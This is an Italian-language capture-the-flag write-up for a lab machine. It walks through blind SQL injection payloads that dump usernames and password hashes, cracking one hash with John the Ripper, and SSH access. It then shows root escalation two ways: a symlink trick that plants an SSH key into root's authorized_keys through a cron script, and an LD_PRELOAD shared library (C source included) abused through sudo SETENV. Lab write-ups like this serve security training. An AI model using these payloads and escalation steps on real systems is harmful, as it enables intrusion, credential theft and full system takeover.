# 📝 Writeup: lab_Type_Juggling & Advanced Privilege Escalation

*   **Target OS:** Ubuntu 22.04 (Docker Container)
*   **Vulnerabilità Web:** Boolean-Based Blind SQL Injection
*   **Vettori di Escalation:** Symlink Follow Attack / Sudo LD_PRELOAD Hijacking
*   **Difficoltà:** Medium / Hard

---

## 🧭 Fase 1: Foothold Web & Scripting Blind SQLi

L'analisi della barra di ricerca sulla pagina `dashboard.php` ha rivelato una vulnerabilità **Boolean-Based Blind SQL Injection** nel parametro `search`. L'applicazione rispondeva con la stringa di conferma `"Cataloged in secure storage"` solo quando la query condizionale iniettata risultava vera.

L'estrazione dei metadati e delle credenziali è stata automatizzata tramite uno script Python personalizzato basato sulla libreria `requests` e sui log dinamici di `pwntools`. 

### 🛠️ Query di Enumerazione SQLi Utilizzate

*   **Nome del Database attuale:**
    ```sql
    '+or+(substring(database(),{att},1)='{character}')--+-
    ```
    *Risultato:* `tracking_db`

*   **Mappatura della tabella di sistema:**
    ```sql
    '+or+(substring((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1),{att},1)='{character}')--+-
    ```
    *Risultato:* `users`

*   **Mappatura delle colonne della tabella `users`:**
    ```sql
    '+or+(substring((select+column_name+from+information_schema.columns+where+table_schema=database()+and+table_name='users'+limit+1,1),{att},1)='{character}')--+-
    ```
    *Risultato:* `id`, `username`, `password_hash`

*   **Dump Combinato di Username e Hash (Query Definitiva):**
    Utilizzando la combinazione di `GROUP_CONCAT` e `CONCAT` per unire i record separandoli con un delimitatore, inserito all'interno del ciclo iterativo di Python:
    ```sql
    '+OR+(SUBSTRING((SELECT+GROUP_CONCAT(CONCAT(username,'-',password_hash))+FROM+users),{att},1)='{character}')+--+
    ```

*   **Output dell'estrazione:**
    ```text
    admin-8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918,bert-64a1e1972b663b35a8c06b453ce018251efef00925fb414217f6087f179031b8
    ```

---

## 🔨 Fase 2: Cracking Offline dell'Hash & SSH

Isolato l'hash SHA-256 appartenente all'utente `bert` (`64a1e197...`), è stato avviato il cracking offline sulla macchina host tramite **John the Ripper**. 

Per evitare conflitti di overhead legati al multi-threading di OpenMP su algoritmi veloci (che portavano alla chiusura istantanea della sessione senza mostrare visivamente l'output), l'attacco è stato forzato a singolo core:

```bash
OMP_NUM_THREADS=1 john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt bert.txt
```

*   **Password identificata in chiaro:** `fuckyooh21`

### 🏃 Connessione iniziale
Ottenute le credenziali, è stato eseguito l'accesso laterale al sistema operativo del container tramite il servizio SSH attestato sulla porta interna `2222`:

```bash
ssh bert@172.18.0.1 -p 2222
```
*   **User Flag:** Riscattabile nella home directory (`cat /home/bert/user.txt`).

---

## ⚡ Fase 3: Privilege Escalation - Vettore A (Symlink Follow Attack)

La ricognizione del file system ha evidenziato uno script in esecuzione periodica da parte di root situato in `/opt/cron_root.sh`. Il codice presentava una vulnerabilità di **Arbitrary File Append** dovuta all'uso insicuro di `cat` all'interno di una cartella utente controllata da Bert:

```bash
cat "$BACKUP_DIR/authorized_keys" >> "$TARGET_DIR/authorized_keys"
```

### 🎯 Sfruttamento della Falla
Abusando del fatto che `cat` segue i link simbolici (*symlink following*), la trappola è stata configurata eseguendo i seguenti passaggi nella shell di `bert`:

1.  Creazione di un link simbolico chiamato `authorized_keys` dentro la cartella `sync/` che punta direttamente al file blindato delle chiavi di root:
    ```bash
    ln -s /root/.ssh/authorized_keys /home/bert/sync/authorized_keys
    ```
2.  Iniezione del testo della chiave pubblica creata su Kali sopra il link simbolico appena generato. Il Kernel Linux ha seguito il puntatore in scrittura, deviando il flusso:
    ```bash
    cat /home/bert/id_rsa.pub > /home/bert/sync/authorized_keys
    ```
3.  Al passaggio successivo del cronjob, lo script ha assimilato la chiave ed eliminato il link fittizio tramite `rm`.
4.  Connessione da Kali via SSH utilizzando la corrispondente chiave privata per ottenere l'accesso root diretto:
    ```bash
    ssh -i id_rsa root@172.18.0.1 -p 2222
    ```

---

## 💻 Fase 4: Privilege Escalation - Vettore B (Sudo LD_PRELOAD)

Un secondo vettore indipendente inserito nella configurazione di `/etc/sudoers` ha permesso all'utente `bert` di invocare il comando `/usr/bin/uptime` mantenendo le variabili d'ambiente di sessione (`SETENV`).

```text
bert ALL=(root) SETENV: /usr/bin/uptime
```

### 🔬 Codice Operativo in C (`evil.c`)
È stato sviluppato un file sorgente in C sfruttando la macro del costruttore (`__attribute__((constructor))`) per forzare l'esecuzione del codice malevolo prima del caricamento del `main()` di uptime, pulendo i privilegi reali ed effettivi del processo tramite `setreuid`/`setregid`:

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void __attribute__((constructor)) gconv()
{
        setreuid(0,0);
        setregid(0,0);
        char *args[] = {"/bin/bash", "-p", NULL};
        execve("/bin/bash",args,NULL);
}
```

### 🥏 Compilazione ed Iniezione
La libreria è stata compilata come oggetto condiviso (`.so`) con codice indipendente dalla posizione (`-fPIC`):

```bash
gcc -shared -o /tmp/evil.so -fPIC evil.c
```

L'attacco è stato innescato anteponendo la variabile d'ambiente `LD_PRELOAD` alla chiamata sudo dell'eseguibile autorizzato:

```bash
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/uptime
```

Il costruttore ha intercettato l'esecuzione, impostato l'UID a 0 e aperto una shell Bash interattiva con i massimi permessi di sistema.

*   **Root Flag:** Riscattabile nel percorso blindato (`cat /root/root.txt`).

